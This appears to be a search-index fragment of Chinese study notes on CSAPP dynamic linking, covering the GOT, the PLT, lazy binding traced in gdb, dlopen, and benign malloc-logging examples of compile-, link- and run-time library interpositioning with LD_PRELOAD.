\u5b9e\u8df5\u8bc1\u660e\uff0c\u52a8\u6001\u94fe\u63a5\u4f1a\u635f\u5931 1% ~ 5% \u7684\u6548\u7387\uff0c\u4f46\u5c31\u6362\u6765\u7684\u597d\u5904\u800c\u8a00\u662f\u503c\u5f97\u7684 2. \u4f4d\u7f6e\u65e0\u5173\u4ee3\u7801 \ud83e\uddd0 \u4f4d\u7f6e\u65e0\u5173\u4ee3\u7801 (position-independent code): \u53ef\u4ee5\u5728\u4e3b\u5b58\u4efb\u610f\u4f4d\u7f6e\u8fd0\u884c\uff0c\u4e0d\u53d7\u7edd\u5bf9\u5730\u5740\u5f71\u54cd\u7684\u4ee3\u7801 (1). Global Offset Table \ud83e\uddd0 \u52a0\u8f7d\u540e\u518d\u6267\u884c\u91cd\u5b9a\u4f4d\u7684\u96be\u70b9\u5728\u4e8e: \u4f4d\u7f6e\u65e0\u5173\u7684\uff0ci.e. \u7f16\u8bd1\u65f6\u4e0d\u786e\u5b9a _.so \u7684\u5185\u5b58\u5730\u5740\uff0c\u53ef\u4ee5\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u7684\u4efb\u4f55\u4f4d\u7f6e\u4e0d\u5f71\u54cd\u4f7f\u7528 \u4e0d\u540c\u8fdb\u7a0b\u5171\u4eab _.so \u7684\u4ee3\u7801\u6bb5 .text \uff0c\u4e14\u8fdb\u7a0b\u4ee3\u7801\u533a\u53ea\u8bfb \u65e9\u671f\u5171\u4eab\u5e93\u5728\u8fd0\u884c\u524d\u5c31\u9884\u5148\u5206\u914d\u56fa\u5b9a\u7684\u5185\u5b58\u5730\u5740\uff0c\u867d\u7136\u7b80\u5316\u4e86\u94fe\u63a5\uff0c\u4f46\u5185\u5b58\u7ba1\u7406\u5341\u5206\u6df7\u4e71 \u57fa\u672c\u601d\u8def\u662f\u628a\u4ee3\u7801\u6bb5\u91cd\u5b9a\u4f4d\u65f6\u9700\u8981\u4fee\u6539\u7684\u5730\u65b9\u5206\u79bb\u5230\u6570\u636e\u6bb5\u3002ELF \u7684\u505a\u6cd5\u662f\uff1a \u5728\u6570\u636e\u6bb5\u5efa\u7acb\u4e00\u4e2a\u6307\u9488\u6570\u7ec4 \u2014\u2014 \u5168\u5c40\u504f\u79fb\u8868 (GOT) \u7531\u4e8e\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u8ddd\u79bb\u56fa\u5b9a\uff0c\u7f16\u8bd1\u65f6\u53ef\u4ee5\u8ba9\u4ee3\u7801\u6bb5\u4e2d\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u90e8\u5206\u901a\u8fc7\u76f8\u5bf9\u504f\u79fb\u6307\u5411 GOT \u8fd9\u6837\uff0c\u8fd0\u884c\u65f6 dl \u786e\u5b9a\u5404\u7b26\u53f7\u5730\u5740\u540e\uff0c\u4fee\u6539 GOT \u8fdb\u884c\u91cd\u5b9a\u4f4d\uff1b\u4e0d\u540c\u8fdb\u7a0b\u5171\u4eab _.so \u7684\u4ee3\u7801\u6bb5\uff0c\u4f7f\u7528\u4e0d\u540c\u7684\u6570\u636e\u6bb5\u3002 note \u7ecf\u6d4b\u8bd5 ( gcc 10.2 )\uff0c\u4e0d\u7ba1\u5168\u5c40\u53d8\u91cf\u662f\u5426\u88ab\u5916\u90e8\u52a8\u6001\u5f15\u7528\uff0c\u90fd\u653e\u5728 .data \u6bb5\uff0c\u91cd\u5b9a\u4f4d\u539f\u7406\u662f\u4e0d\u53d8\u7684 dl \u7531 BFS \u6784\u9020\u5168\u5c40\u7b26\u53f7\u8868\u65f6\uff0c\u540e\u6765\u7684\u7b26\u53f7\u4f1a\u88ab\u5148\u524d\u7684\u540c\u540d\u7b26\u53f7\u8986\u76d6\uff1b\u731c\u6d4b\u9759\u6001\u94fe\u63a5\u4e4b\u6240\u4ee5\u6709\u5f31\u7b26\u53f7\u662f\u5386\u53f2\u539f\u56e0\uff0cdl \u7531\u4e8e LD_PRELOAD \u7684\u5b58\u5728\uff0c\u7b26\u53f7\u8986\u76d6\u66f4\u52a0\u65b9\u4fbf (2). Lazy Binding & Procedure Linkage Table \ud83e\uddd0 \u53ef\u80fd\u6709\u5f88\u591a\u51fd\u6570\u6839\u672c\u6267\u884c\u4e0d\u5230 (\u4f8b\u5982\u4e00\u4e9b\u9519\u8bef\u5904\u7406\u51fd\u6570)\uff0c\u91cd\u5b9a\u4f4d\u65f6\u628a\u6240\u6709\u51fd\u6570\u5168\u90e8\u94fe\u63a5\u597d\u662f\u6ca1\u6709\u5fc5\u8981\u7684\uff0c\u7531\u6b64 GNU \u91c7\u7528\u5ef6\u8fdf\u7ed1\u5b9a (lazy binding) \u5bf9\u52a8\u6001\u94fe\u63a5\u8fdb\u884c\u4f18\u5316\u3002\u57fa\u672c\u601d\u8def\u4e3a: \u76f4\u5230\u7b2c\u4e00\u6b21\u8c03\u7528\u51fd\u6570 $f$ \u65f6\uff0c\u4ee5 reloc entry \u4e3a\u53c2\u6570\u8c03\u7528 dl\uff0c\u6267\u884c\u91cd\u5b9a\u4f4d \u4ee3\u7801\u533a\u989d\u5916\u5b9a\u4e49\u4e86\u4e00\u4e2a\u8fc7\u7a0b\u94fe\u63a5\u8868 (PLT)\uff0c\u901a\u8fc7 GOT \u548c PLT \u7684\u534f\u4f5c\u5b9e\u73b0\u5bf9\u51fd\u6570\u7684\u5ef6\u8fdf\u7ed1\u5b9a\u3002\u5177\u4f53\u5b9e\u73b0\u4e0a\uff0c ELF \u5c06 .got \u62c6\u5206\u6210\u4e24\u4e2a\u90e8\u5206: .got.plt : \u4fdd\u5b58\u51fd\u6570\u7684\u5730\u5740 .got.plt[0] : \u2002 addr of .dynamic section .got.plt[1] : \u2002 addr of reloc entries .got.plt[2] : \u2002 \u52a8\u6001\u94fe\u63a5\u5668 ld-linux.so \u7684\u5165\u53e3\u70b9 .got : \u4fdd\u5b58\u5168\u5c40\u53d8\u91cf\u7684\u5730\u5740 example: \u2002 progd \u7528 readelf \u67e5\u770b progd \u7684 GOT \u548c PLT \u8868 (\u8fd0\u884c\u524d\uff0c\u5173\u95ed\u6808\u968f\u673a\u5316): disas of .plt Disassembly of section .plt : 0000000000401020 < .plt >: 401020: ff 35 e2 2f 00 00 pushq 0x2fe2(%rip) # 404008 <_GLOBAL_OFFSET_TABLE_+0x8> 401026: ff 25 e4 2f 00 00 jmpq *0x2fe4(%rip) # 404010 <_GLOBAL_OFFSET_TABLE_+0x10> 40102c: 0f 1f 40 00 nopl 0x0(%rax) 0000000000401030 < printf@plt >: 401030: ff 25 e2 2f 00 00 jmpq *0x2fe2(%rip) # 404018 <printf@GLIBC_2.2.5> 401036: 68 00 00 00 00 pushq $0x0 40103b: e9 e0 ff ff ff jmpq 401020 <.plt> 0000000000401040 < addvec@plt >: 401040: ff 25 da 2f 00 00 jmpq *0x2fda(%rip) # 404020 <addvec> 401046: 68 01 00 00 00 pushq $0x1 40104b: e9 d0 ff ff ff jmpq 401020 <.plt> view \u2002.got.plt $ readelf -x .got.plt progd NOTE: This section has relocations against it, but these have NOT been applied to this dump. 0x00404000: 003e4000 00000000 00000000 00000000 .>@............. 0x00404010: 00000000 00000000 36104000 00000000 ........6.@..... 0x00404020: 46104000 00000000 F.@..... view \u2002.dynamic $ readelf -x .dynamic progd 0x00403e00 01000000 00000000 66000000 00000000 ........f....... 0x00403e10 01000000 00000000 75000000 00000000 ........u....... ... ... \u4ece\u4e2d\u63d0\u53d6\u4fe1\u606f\uff0c\u603b\u7ed3\u4e3a\u4e0b\u56fe \u5728\u63a7\u5236\u4ea4\u7ed9 progd \u540e\uff0c\u6b64\u65f6 dl \u5df2\u7ecf\u786e\u5b9a\u4e86\u6240\u6709\u51fd\u6570\u7684\u8fd0\u884c\u65f6\u5730\u5740\u3002\u5f53 addvec \u7b2c\u4e00\u6b21\u88ab\u8c03\u7528\u65f6: \u2460. \u4e0d\u76f4\u63a5\u8c03\u7528 addvec \uff0c\u5148\u8fdb\u5165\u5b83\u7684 PLT \u6761\u76ee .plt[2] \u2461. \u8df3\u8f6c\u5230 .got.plt[4] \uff0c\u800c\u5b83\u6307\u5411 .plt[2] \u7684\u7b2c\u4e8c\u6761\u6307\u4ee4\uff0c\u7b49\u4ef7\u4e8e\u6267\u884c\u4e0b\u4e00\u6761\u8bed\u53e5 \u2462. \u628a addvec \u7684 ID 0x1 \u538b\u5165\u6808\u4e2d\uff0c\u8df3\u8f6c\u5230 .plt[0] \uff0c\u628a dl \u9700\u8981\u7684\u53c2\u6570\u538b\u5165\u6808\u4e2d \u2463. \u95f4\u63a5\u8df3\u8f6c\u5230 dl \u4e2d\uff0c\u6b64\u65f6\u6808\u4e2d\u6709 0x1 \u548c .got.plt[1] \u4e24\u4e2a\u53c2\u6570\uff0cdl \u6839\u636e\u53c2\u6570\u786e\u5b9a addvec \u7684\u8fd0\u884c\u65f6\u5730\u5740\uff0c\u91cd\u5b9a\u4f4d .got.plt[4] \uff0c\u7136\u540e\u628a\u63a7\u5236\u4ea4\u8fd8\u7ed9 addvec \u901a\u8fc7 gdb \u67e5\u770b\u5ef6\u8fdf\u7ed1\u5b9a\u7684\u8fc7\u7a0b gdb commands $ gdb progd ... $ ( gdb ) b* 0x401154 Breakpoint 1 at 0x401154 $ ( gdb ) b* 0x401159 Breakpoint 2 at 0x401159 $ ( gdb ) run Breakpoint 1, 0x0000000000401154 in main () $ ( gdb ) info functions ^printf$ 0x00007ffff7e1cb10 printf $ ( gdb ) info functions ^addvec$ 0x00007ffff7fc40e9 addvec $ ( gdb ) maint info sections ... ... [19] 0x00403e00->0x00403fe0 at 0x00002e00: .dynamic ALLOC LOAD DATA HAS_CONTENTS [20] 0x00403fe0->0x00404000 at 0x00002fe0: .got ALLOC LOAD DATA HAS_CONTENTS [21] 0x00404000->0x00404028 at 0x00003000: .got.plt ALLOC LOAD DATA HAS_CONTENTS [22] 0x00404028->0x00404048 at 0x00003028: .data ALLOC LOAD DATA HAS_CONTENTS [23] 0x00404048->0x00404058 at 0x00003048: .bss ALLOC ... ... $ ( gdb ) x/5xg 0x404000 0x404000: 0x0000000000403e00 0x00007ffff7ffe1a0 0x404010: 0x00007ffff7fe7d30 0x0000000000401036 0x404020 <addvec@got.plt>: 0x0000000000401046 $ ( gdb ) continue Continuing. Breakpoint 2, 0x0000000000401159 in main () $ ( gdb ) x/5xg 0x404000 0x404000: 0x0000000000403e00 0x00007ffff7ffe1a0 0x404010: 0x00007ffff7fe7d30 0x0000000000401036 0x404020 <addvec@got.plt>: 0x00007ffff7fc40e9 disas of main 0000000000401136 < main >: 401136: 55 push %rbp 401137: 48 89 e5 mov %rsp,%rbp 40113a: b9 02 00 00 00 mov $0x2,%ecx 40113f: 48 8d 15 0a 2f 00 00 lea 0x2f0a(%rip),%rdx # 404050 <z> 401146: 48 8d 35 f3 2e 00 00 lea 0x2ef3(%rip),%rsi # 404040 <y> 40114d: 48 8d 3d e4 2e 00 00 lea 0x2ee4(%rip),%rdi # 404038 <x> 401154: e8 e7 fe ff ff callq 401040 <addvec@plt> 401159: 8b 15 f5 2e 00 00 mov 0x2ef5(%rip),%edx # 404054 <z+0x4> 40115f: 8b 05 eb 2e 00 00 mov 0x2eeb(%rip),%eax # 404050 <z> 401165: 89 c6 mov %eax,%esi 401167: 48 8d 3d 96 0e 00 00 lea 0xe96(%rip),%rdi # 402004 <_IO_stdin_used+0x4> 40116e: b8 00 00 00 00 mov $0x0,%eax 401173: e8 b8 fe ff ff callq 401030 <printf@plt> 401178: b8 00 00 00 00 mov $0x0,%eax 40117d: 5d pop %rbp 40117e: c3 retq 40117f: 90 nop 3. \u76f8\u5173\u6570\u636e\u7ed3\u6784 \ud83e\uddd0 (1). .interp \ud83e\uddd0 \u52a8\u6001\u94fe\u63a5\u5668\u7684\u8def\u5f84\u7531 ELF \u6587\u4ef6\u51b3\u5b9a\uff0c\u4ee5\u5b57\u7b26\u4e32\u7684\u5f62\u5f0f\u4fdd\u5b58\u5728 .interp \u4e2d\u3002 $ readelf -l progd | grep interpreter [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] (2). .dynamic \ud83e\uddd0 .dynamic \u5bf9\u52a8\u6001\u94fe\u63a5\u6765\u8bf4\u662f\u6700\u91cd\u8981\u7684\u7ed3\u6784\uff0c\u4fdd\u5b58\u4e86\u4ee5\u4e0b\u57fa\u672c\u4fe1\u606f: \u53ef\u6267\u884c\u7a0b\u5e8f\u4f9d\u8d56\u4e8e\u54ea\u4e9b\u5171\u4eab\u5bf9\u8c61 \u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u8868\u7684\u4f4d\u7f6e, \u52a8\u6001\u94fe\u63a5\u91cd\u5b9a\u4f4d\u8868\u7684\u4f4d\u7f6e \u5171\u4eab\u5bf9\u8c61\u521d\u59cb\u5316\u4ee3\u7801\u7684\u5730\u5740 \u7b49 typedef struct { Elf64_Sxword d_tag ; /* Dynamic entry type */ union { Elf64_Xword d_val ; /* Integer value */ Elf64_Addr d_ptr ; /* Address value */ } d_un ; } Elf64_Dyn ; .dynamic \u4e5f\u662f\u4e00\u4e2a\u7ed3\u6784\u6570\u7ec4\uff0c\u7531\u7c7b\u578b\u503c d_tag \u548c\u9644\u52a0\u7684\u6570\u636e\u7ec4\u6210\u3002\u4e00\u4e9b\u5e38\u89c1\u7684\u7c7b\u578b\u6709: value of d_tag meaning of d_un DT_SYMTAB \u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u8868\u7684\u5730\u5740\uff0c d_ptr \u8868\u793a .dynsym \u7684\u5730\u5740 DT_STRTAB \u52a8\u6001\u94fe\u63a5\u5b57\u7b26\u4e32\u8868\u7684\u5730\u5740\uff0c d_ptr \u8868\u793a .dynstr \u7684\u5730\u5740 DT_STRSZ \u52a8\u6001\u94fe\u63a5\u5b57\u7b26\u4e32\u5927\u5c0f\uff0c d_val \u8868\u793a\u5927\u5c0f DT_HASH \u52a8\u6001\u94fe\u63a5 hash \u8868\u5730\u5740\uff0c d_ptr \u8868\u793a .hash \u7684\u5730\u5740 DT_INIT \u521d\u59cb\u5316\u4ee3\u7801\u5730\u5740 DT_NEED \u4f9d\u8d56\u7684\u5171\u4eab\u5e93\u6587\u4ef6\uff0c d_ptr \u8868\u793a\u6587\u4ef6\u540d DT_REL / DT_RELA \u52a8\u6001\u94fe\u63a5\u91cd\u5b9a\u4f4d\u8868\u5730\u5740 (3). .dynsym \ud83e\uddd0 \u4e3a\u4e86\u8868\u793a \u52a8\u6001\u94fe\u63a5\u6a21\u5757 \u4e4b\u95f4\u7684\u7b26\u53f7\u5f15\u7528\u5173\u7cfb\uff0cELF \u4e13\u95e8\u5b9a\u4e49\u4e86\u4e00\u4e2a\u52a8\u6001\u7b26\u53f7\u8868 .dynsym \uff0centry \u7ed3\u6784\u548c\u9759\u6001\u94fe\u63a5\u76f8\u540c \u52a8\u6001\u94fe\u63a5\u6a21\u5757\u901a\u5e38\u6709 symtab \u548c dynsym \u4e24\u4e2a\u7b26\u53f7\u8868 \u548c .symtab \u4e0d\u540c\u7684\u662f\uff0c .dynsym \u4e0d\u4fdd\u5b58\u6a21\u5757\u79c1\u6709\u9759\u6001\u53d8\u91cf\uff0c .dynsym \u901a\u5e38\u662f .symtab \u7684\u5b50\u96c6 \u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u4f7f\u7528 gdb \u67e5\u770b\u5404\u4e2a\u7b26\u53f7\u88ab dl \u5206\u914d\u7684\u5730\u5740 \u548c .symtab \u7c7b\u4f3c\uff0c .dynsym \u4e5f\u6709\u8f85\u52a9\u7684\u5b57\u7b26\u4e32\u8868 .dynstr (4). reloc entry \ud83e\uddd0 entry \u7684\u7ed3\u6784\u548c\u9759\u6001\u94fe\u63a5\u4e00\u6837; .rel.dyn \u548c .rel.plt \u5206\u522b\u8d1f\u8d23\u4fee\u6b63 .got \u548c .got.plt \u3002 $ readelf -r progd $ readelf -r progd \u91cd\u5b9a\u4f4d\u8282 '.rela.dyn' at offset 0x490 contains 4 entries: \u504f\u79fb\u91cf \u4fe1\u606f \u7c7b\u578b \u7b26\u53f7\u503c \u7b26\u53f7\u540d\u79f0 + \u52a0\u6570 000000403fe0 000100000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTM[...] + 0 000000403fe8 000300000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0 000000403ff0 000500000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0 000000403ff8 000600000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCl[...] + 0 \u91cd\u5b9a\u4f4d\u8282 '.rela.plt' at offset 0x4f0 contains 2 entries: \u504f\u79fb\u91cf \u4fe1\u606f \u7c7b\u578b \u7b26\u53f7\u503c \u7b26\u53f7\u540d\u79f0 + \u52a0\u6570 000000404018 000200000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0 000000404020 000400000007 R_X86_64_JUMP_SLO 0000000000000000 addvec + 0 4. \u663e\u5f0f\u52a8\u6001\u94fe\u63a5 \ud83e\uddd0 Linux \u63d0\u4f9b\u4e86 dynamic linker \u7684\u7b80\u5355\u63a5\u53e3\uff0c\u5141\u8bb8\u7a0b\u5e8f\u8fd0\u884c\u65f6\u663e\u5f0f\u52a0\u8f7d\u548c\u94fe\u63a5\u5171\u4eab\u5e93\u3002 interfaces #include <dlfcn.h> /* \u52a0\u8f7d\u548c\u94fe\u63a5\u5171\u4eab\u5e93 filename * @flag: RTLD_NOW: \u7acb\u5373\u89e3\u6790\u5916\u90e8\u7b26\u53f7\u5f15\u7528; RTLD_LAZY: \u5ef6\u8fdf\u89e3\u6790. */ void * dlopen ( const char * filename , int flag ); /* \u5982\u679c\u7b26\u53f7\u5b58\u5728\uff0c\u8fd4\u56de\u7b26\u53f7\u7684\u5730\u5740 * @handle: \u5171\u4eab\u5e93\u7684\u53e5\u67c4 * @symbol: \u5171\u4eab\u5e93\u7684\u7b26\u53f7\u540d */ void * dlsym ( void * handle , char * symbol ); /* \u5982\u679c\u6ca1\u6709\u5176\u4ed6\u5171\u4eab\u5e93\u4f7f\u7528\u8fd9\u4e2a\u5171\u4eab\u5e93\uff0c\u5378\u8f7d\u5b83 */ int dlclose ( void * handle ); /* \u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u63cf\u8ff0 dlopen, dlsym, dlclose \u6700\u8fd1\u7684\u9519\u8bef */ const char * dlerror ( void ); example:\u2002\u52a8\u6001\u94fe\u63a5 libvector.so \uff0c\u5e76\u8c03\u7528 addvec dll.c #include <dlfcn.h> #include <stdio.h> #include <stdlib.h> int x [ 2 ] = { 1 , 2 }; int y [ 2 ] = { 3 , 4 }; int z [ 2 ]; int main () { void * handle ; void ( * addvec )( int * , int * , int * , int ); char * error ; /* dynamically load the shared library containing addvec() */ handle = dlopen ( \"./libvector.so\" , RTLD_LAZY ); if ( ! handle ) { fprintf ( stderr , \"%s \\n \" , dlerror ()); exit ( 1 ); } /* Get a pointer to the addvec() function we just loaded */ addvec = dlsym ( handle , \"addvec\" ); if (( error = dlerror ()) != NULL ) { fprintf ( stderr , \"%s \\n \" , error ); exit ( 1 ); } /* Now we can call addvec() just like any other function */ addvec ( x , y , z , 2 ); printf ( \"z = [%d %d] \\n \" , z [ 0 ], z [ 1 ]); /* Unload the shared library */ if ( dlclose ( handle ) < 0 ) { fprintf ( stderr , \"%s \\n \" , dlerror ()); exit ( 1 ); } return 0 ; } console $ gcc -rdynamic -o progd2 dll.c -ldl 5. \u5e93\u6253\u6869 \ud83e\uddd0 Linux \u652f\u6301\u5e93\u6253\u6869 (library interpositioning) \u6280\u672f\uff0c\u53ef\u4ee5\u622a\u83b7\u5bf9\u5171\u4eab\u5e93\u51fd\u6570\u7684\u8c03\u7528\uff0c\u6267\u884c\u81ea\u5df1\u7684\u4ee3\u7801\u3002 (1). \u7f16\u8bd1\u65f6\u6253\u6869 \ud83e\uddd0 int.c #include <malloc.h> // local dir #include <stdio.h> int main () { int * p = malloc ( 32 ); free ( p ); return 0 ; } mymalloc.c #ifdef COMPILETIME #include <malloc.h> // system dir #include <stdio.h> /* malloc wrapper function */ void * mymalloc ( size_t size ) { void * ptr = malloc ( size ); printf ( \"malloc(%d)=%p \\n \" , ( int ) size , ptr ); return ptr ; } /* free wrapper function */ void myfree ( void * ptr ) { free ( ptr ); printf ( \"free(%p) \\n \" , ptr ); } #endif malloc.h #define malloc(size) mymalloc(size) #define free(ptr) myfree(ptr) #include <stdio.h> void * mymalloc ( size_t size ); void myfree ( void * ptr ); run intc $ gcc -DCOMPILETIME -c mymalloc.c $ gcc -I. -o intc int.c mymalloc.o $ ./intc malloc(32)=0x5628b97c92a0 free(0x5628b97c92a0) -I. \u544a\u8bc9 C \u9884\u5904\u7406\u5668\uff0c\u641c\u7d22\u7cfb\u7edf\u76ee\u5f55\u4e4b\u524d\u5148\u5728\u5f53\u524d\u76ee\u5f55\u627e malloc.h -D \u7f16\u8bd1\u65f6\u5f00\u542f\u67d0\u4e2a\u5b8f (2). \u94fe\u63a5\u65f6\u6253\u6869 \ud83e\uddd0 int.c #include <malloc.h> // local dir #include <stdio.h> int main () { int * p = malloc ( 32 ); free ( p ); return 0 ; } mymalloc.c #ifdef LINKTIME #include <stdio.h> void * __real_malloc ( size_t size ); void __real_free ( void * ptr ); /* malloc wrapper function */ void * __wrap_malloc ( size_t size ) { void * ptr = __real_malloc ( size ); /* call libc malloc */ printf ( \"malloc(%d) = %p \\n \" , ( int ) size , ptr ); return ptr ; } /* free wrapper function */ void __wrap_free ( void * ptr ) { __real_free ( ptr ); /* call libc free */ printf ( \"free(%p) \\n \" , ptr ); } #endif run intl $ gcc -DLINKTIME -c mymalloc.c $ gcc -c int.c $ gcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o $ ./intl malloc(32) = 0x55e39f2d22a0 free(0x55e39f2d22a0) --wrap f :\u2002 \u628a\u5bf9 f \u7684\u5f15\u7528\u89e3\u6790\u4e3a __wrap_f \uff0c\u5e76\u4e14\u628a\u5bf9 __real_f \u7684\u5f15\u7528\u89e3\u6790\u4e3a f (3). \u8fd0\u884c\u65f6\u6253\u6869 \ud83e\uddd0 \u7f16\u8bd1\u65f6\u6253\u6869\u9700\u8981\u80fd\u8bbf\u95ee\u6e90\u4ee3\u7801\uff0c\u94fe\u63a5\u65f6\u6253\u6869\u9700\u8981\u80fd\u8bbf\u95ee\u76ee\u6807\u6587\u4ef6\uff0c\u800c\u8fd0\u884c\u65f6\u6253\u6869\u53ea\u9700\u8981\u80fd\u8bbf\u95ee\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4f9d\u8d56\u4e8e\u52a8\u6001\u94fe\u63a5\u5668\u7684\u73af\u5883\u53d8\u91cf LD_PRELOAD : \u82e5 LD_PRELOAD \u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u8def\u5f84\u5217\u8868\uff0c\u52a0\u8f7d\u4e00\u4e2a\u7a0b\u5e8f\u65f6\uff0c ld-linux.so \u4f1a\u5148\u641c\u7d22 LD_PRELOAD \u7684\u5185\u5bb9\uff0c\u7136\u540e\u518d\u641c\u7d22\u5176\u4ed6\u7684\u5e93 \u56e0\u6b64\u53ef\u4ee5\u5bf9\u4efb\u4f55\u5171\u4eab\u5e93\u7684\u4efb\u4f55\u51fd\u6570\u6253\u6869\uff0c\u5305\u62ec libc.so int.c #include <malloc.h> // local dir #include <stdio.h> int main () { int * p = malloc ( 32 ); free ( p ); return 0 ; } mymalloc.c #ifdef RUNTIME #define _GNU_SOURCE #include <dlfcn.h> #include <stdio.h> #include <stdlib.h> /* malloc wrapper function */ void * malloc ( size_t size ) { void * ( * mallocp )( size_t size ); char * error ; mallocp = dlsym ( RTLD_NEXT , \"malloc\" ); /* get addr of libc malloc */ if (( error = dlerror ()) != NULL ) { fputs ( error , stderr ); exit ( 1 ); } char * ptr = mallocp ( size ); /* call libc malloc */ fprintf ( stderr , \"malloc(%d) = %p \\n \" , ( int ) size , ptr ); return ptr ; } /* free wrapper function */ void free ( void * ptr ) { void ( * freep )( void * ) = NULL ; char * error ; if ( ! ptr ) return ; freep = dlsym ( RTLD_NEXT , \"free\" ); /* get addr of libc free */ if (( error = dlerror ()) != NULL ) { fputs ( error , stderr ); exit ( 1 ); } freep ( ptr ); fprintf ( stderr , \"free(%p) \\n \" , ptr ); } #endif run intr $ gcc -DRUNTIME -shared -fpic -o mymalloc.so mymalloc.c -ldl $ gcc -o intr int.c $ LD_PRELOAD = \"./mymalloc.so\" ./intr malloc(32) = 0x55a0927a12a0 free(0x55a0927a12a0) $ LD_PRELOAD = \"./mymalloc.so\" /usr/bin/uptime ... mymalloc.c \u4e2d\u4e0d\u53ef\u4f7f\u7528 printf \uff0c printf \u4f3c\u4e4e\u4e5f\u4f1a\u8c03\u7528 malloc \uff0c\u56e0\u800c\u9020\u6210\u65e0\u7a77\u9012\u5f52\u3002","title":"3. dynamic linking"},{"location":"_csapp/_Link/dynlink/#1","text":"\u9759\u6001\u94fe\u63a5\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u63d0\u9ad8\u4e86\u6a21\u5757\u5316\u7684\u6548\u7387\uff0c\u4f46: \u6d6a\u8d39\u5185\u5b58: \u2002 \u57fa\u672c\u4e0a\u6bcf\u4e2a C \u7a0b\u5e8f\u7684\u4ee3\u7801\u6bb5\u90fd\u6709\u6807\u51c6 I/O \u51fd\u6570 \u4e0d\u6613\u66f4\u65b0: \u2002 \u5982\u679c\u67d0\u4e2a\u6a21\u5757 _.o \u66f4\u65b0\uff0c\u53ef\u80fd\u9700\u8981\u6574\u4e2a\u9879\u76ee\u91cd\u65b0\u7f16\u8bd1 \u5171\u4eab\u5e93\u662f\u81f4\u529b\u4e8e\u89e3\u51b3\u9759\u6001\u5e93\u7f3a\u9677\u7684\u73b0\u4ee3\u4ea7\u7269\u3002\"\u5171\u4eab\" \u4f53\u73b0\u5728\u4e8e: \u540c\u4e00\u4e2a\u9879\u76ee\u4e0b\u53ea\u9700\u8981 _.so \u7684\u4e00\u4e2a\u526f\u672c \u4e0d\u540c\u8fdb\u7a0b\u5728\u5185\u5b58\u4e2d\u5171\u4eab _.so \u7684 .text \u8282 addvec.c int addcnt = 0 ; void addvec ( int * x , int * y , int * z , int n ) { int i ; addcnt ++ ; for ( i = 0 ; i < n ; ++ i ) z [ i ] = x [ i ] + y [ i ]; } multvec.c int multcnt = 0 ; void multvec ( int * x , int * y , int * z , int n ) { int i ; multcnt ++ ; for ( i = 0 ; i < n ; ++ i ) z [ i ] = x [ i ] * y [ i ]; } main.c #include <stdio.h> #include \"vector.h\" int x [ 2 ] = { 1 , 2 }; int y [ 2 ] = { 3 , 4 }; int z [ 2 ]; int main () { addvec ( x , y , z , 2 ); printf ( \"z = [%d %d] \\n \" , z [ 0 ], z [ 1 ]); return 0 ; } \u4ecd\u4ee5\u8fd9\u90e8\u5206\u7a0b\u5e8f\u4e3a\u4f8b\uff0c\u5148\u901a\u8fc7\u94fe\u63a5\u521b\u5efa\u5171\u4eab\u5e93\uff0c\u5728\u5c06\u5b83\u94fe\u63a5\u5230\u53ef\u6267\u884c\u7a0b\u5e8f\u4e2d: $ gcc -shared -fpic -o libvector.so addvec.c multvec.c $ gcc -no-pie -o progd main.c ./libvector.so \u52a8\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u7684\u6267\u884c\u903b\u8f91\u4e3a: \u5148\u6267\u884c\u90e8\u5206\u94fe\u63a5\uff0c\u590d\u5236\u4e00\u4e9b\u7b26\u53f7\u8868\u548c\u91cd\u5b9a\u4f4d\u4fe1\u606f\uff0c\u65b9\u4fbf\u8fd0\u884c\u65f6\u89e3\u6790\u5bf9 _.so \u7684\u5f15\u7528 \u4f8b\u5982\uff0c progd \u5728\u8fd0\u884c\u524d\u53ef\u4ee5\u786e\u5b9a\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u52a8\u6001\u7b26\u53f7\u3001PLT \u6761\u76ee\u548c\u90e8\u5206 GOT \u6761\u76ee \u8fd0\u884c prog \u540e\uff0cloader \u5148\u628a\u63a7\u5236\u4f20\u9012\u7ed9\u52a8\u6001\u94fe\u63a5\u5668\uff0c\u6267\u884c\u52a8\u6001\u94fe\u63a5: \u4ee5 prog \u4e3a\u6839\u7ed3\u70b9 BFS\uff0c\u88c5\u8f7d\u6240\u6709\u5171\u4eab\u5bf9\u8c61\uff0c\u5408\u5e76\u5b83\u4eec\u7684\u7b26\u53f7\u8868\uff0c\u83b7\u5f97\u5168\u5c40\u7b26\u53f7\u8868 (\u786e\u5b9a\u8fd0\u884c\u65f6\u5730\u5740\u3001\u89e3\u51b3\u7b26\u53f7\u51b2\u7a81\u3001\u586b\u5199\u91cd\u5b9a\u4f4d\u8282) \u91cd\u5b9a\u4f4d prog \u548c\u5404\u4e2a\u6a21\u5757\u7684 GOT \u8868\u548c PLT \u8868\uff0c\u89e3\u6790\u7b26\u53f7\u5f15\u7528 \u91cd\u5b9a\u4f4d\u540e\uff0c\u5982\u679c\u67d0\u4e2a\u6a21\u5757\u6709 .init \u6bb5\uff0c\u6267\u884c\u5b83 \u5c06\u63a7\u5236\u4f20\u9012\u7ed9 prog \uff0c\u7a0b\u5e8f\u5f00\u59cb\u8fd0\u884c \u5b9e\u8df5\u8bc1\u660e\uff0c\u52a8\u6001\u94fe\u63a5\u4f1a\u635f\u5931 1% ~ 5% \u7684\u6548\u7387\uff0c\u4f46\u5c31\u6362\u6765\u7684\u597d\u5904\u800c\u8a00\u662f\u503c\u5f97\u7684","title":"1. 